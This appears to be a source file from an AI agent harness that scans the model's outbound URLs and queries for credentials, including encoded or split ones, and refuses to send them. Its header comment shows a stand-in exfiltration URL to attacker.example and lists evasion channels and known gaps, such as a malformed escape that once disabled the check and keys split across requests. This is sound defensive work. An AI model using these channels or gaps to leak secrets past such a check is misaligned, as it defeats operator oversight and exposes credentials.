'use strict';

// effectors/outbound-secret.js — does a value MYTHOS is about to put on the
// network (a URL, a search query) carry a credential? (2026-09-29 audit, B2d.)
//
// web_fetch, web_search and open_web are tier 0 and browser_navigate tier 2 —
// none asks first — and the leash's credential scan only runs at tier 3+. So a
// key the model had seen could leave in a query string with no check at all:
// https://attacker.example/?k=<key>. This checks the value in the forms a
// careful exfiltration uses, and every form it decodes is decoded again (to a
// bounded depth):
//   - percent-encoding, each %XX on its own and up to eight rounds. The first
//     version used decodeURIComponent, which throws on ONE malformed escape and
//     then decoded nothing: a single "%ZZ" switched the whole check off (the
//     independent review, 2026-09-29);
//   - base64, base64url and hex RUNS found anywhere in the text, each tried at
//     every alignment, so a key with ".png" after it, "~" before it, a "0x"
//     prefix, or a stray character in front is still found;
//   - the value with its dots removed (hex or base64 spread across subdomain
//     labels) and a URL's query values joined (a key split across parameters).
// Called before the request and again for every redirect hop (web-fetch.js
// guardedFetch).
//
// Pattern matching cannot catch every secret: a key with no recognisable shape,
// one encrypted or encoded some other way, or one sent across two requests still
// leaves. This closes the obvious channels; it is not a data-loss-prevention system.

const { scan } = require('./credential-scanner');

const MAX_PERCENT_ROUNDS = 8;
const MAX_DEPTH = 3;      // encodings inside encodings: base64 of base64 of hex
const MAX_FORMS = 256;    // a hard bound on the work done for one value

// Decoded bytes as scannable text. Anything that is not printable ASCII becomes a
// space, so a key in the middle of garbage — a misaligned decode, a non-English
// word before it, a binary prefix — is still one whole, separate run of text.
function printable(buf) {
  return buf.toString('latin1').replace(/[^\x20-\x7e]+/g, ' ');
}

function percentDecodeOnce(s) {
  return s.replace(/%([0-9A-Fa-f]{2})/g, (m, hex) => String.fromCharCode(parseInt(hex, 16)));
}

function rearranged(form) {
  const out = [form.replace(/\+/g, ' '), form.replace(/\./g, '')];
  try { out.push([...new URL(form).searchParams.values()].join('')); } catch (_) { /* not a URL */ }
  return out;
}

function decodedRuns(form) {
  const out = [];
  for (const m of form.matchAll(/[A-Za-z0-9+/_-]{16,}={0,2}/g)) {
    const run = m[0].replace(/-/g, '+').replace(/_/g, '/');
    for (let off = 0; off < 4; off += 1) out.push(printable(Buffer.from(run.slice(off), 'base64')));
  }
  for (const m of form.matchAll(/[0-9A-Fa-f]{32,}/g)) {
    for (let off = 0; off < 2; off += 1) out.push(printable(Buffer.from(m[0].slice(off), 'hex')));
  }
  return out;
}

// Every form of value worth scanning, the value itself first.
function decodedForms(value) {
  const seen = new Set([value]);
  const queue = [{ text: value, depth: 0 }];
  const add = (text, depth) => {
    if (!text || !text.trim() || seen.has(text) || seen.size >= MAX_FORMS) return;
    seen.add(text);
    queue.push({ text, depth });
  };
  while (queue.length) {
    const { text, depth } = queue.shift();
    let cur = text;
    for (let i = 0; i < MAX_PERCENT_ROUNDS; i += 1) {
      const next = percentDecodeOnce(cur);
      if (next === cur) break;
      add(next, depth);
      cur = next;
    }
    for (const r of rearranged(text)) add(r, depth);
    if (depth < MAX_DEPTH) for (const d of decodedRuns(text)) add(d, depth + 1);
  }
  return [...seen];
}

// { name, form } for the first credential found, else null. `form` says how it
// was hidden, so a refusal can be specific without echoing the secret.
function secretInOutbound(value) {
  const s = String(value || '');
  if (!s) return null;
  const forms = decodedForms(s);
  for (let i = 0; i < forms.length; i += 1) {
    const hit = scan({ v: forms[i] });
    if (hit.found) return { name: hit.matches[0].name, form: i === 0 ? 'as written' : 'encoded' };
  }
  return null;
}

function outboundRefusal(what, hit) {
  return `Refusing to send ${what}: it carries what looks like a credential (${hit.name}, ${hit.form}). `
    + 'MYTHOS does not put secrets into web requests. If the operator really means to share one, they can do it themselves.';
}

module.exports = { secretInOutbound, outboundRefusal, _decodedForms: decodedForms };
